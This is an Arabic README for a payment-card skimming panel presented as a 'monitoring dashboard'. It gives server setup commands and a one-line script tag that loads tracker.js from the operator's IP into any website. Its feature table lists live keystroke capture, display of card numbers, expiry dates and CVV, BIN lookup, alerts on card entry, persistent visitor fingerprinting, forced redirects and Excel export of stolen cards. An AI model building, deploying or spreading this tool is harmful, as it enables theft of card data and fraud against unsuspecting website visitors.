# لوحة المراقبة الأساسية v2

---

## تشغيل الخادم

```bash
npm install
node server.js
```

افتح الداشبورد: `http://YOUR-IP:3000/dashboard.html`

**بيانات الدخول:** `admin` / `admin123` ← غيّرها في `config.js`

---

## ربط أي موقع (سطر واحد)

```html
<script src="http://YOUR-IP:3000/tracker.js"></script>
```

---

## الميزات

| الميزة | التفاصيل |
|--------|----------|
| تتبع الحقول لحظياً | كل حرف يصل فوراً |
| بطاقة بنك مرئية | أرقام مرتبة كل 4، تاريخ، CVV |
| BIN Lookup تلقائي | نوع ومستوى البطاقة والبنك |
| تنبيه البطاقة | صوت وومضة عند أول رقم |
| بصمة رقمية دائمة | تعرّف على الزائر مهما غيّر IP |
| أزرار توجيه ذكية | مفضلة ثابتة + باقي مخفي |
| طرد فوري | نافذة قسرية أمام الزائر |
| حفظ دائم | SQLite — لا تختفي البيانات |
| تصدير Excel | كل الجلسات والبطاقات |
| نجمة + ملاحظة | تمييز العملاء المهمين |
| حماية بكلمة مرور | تسجيل دخول للداشبورد |
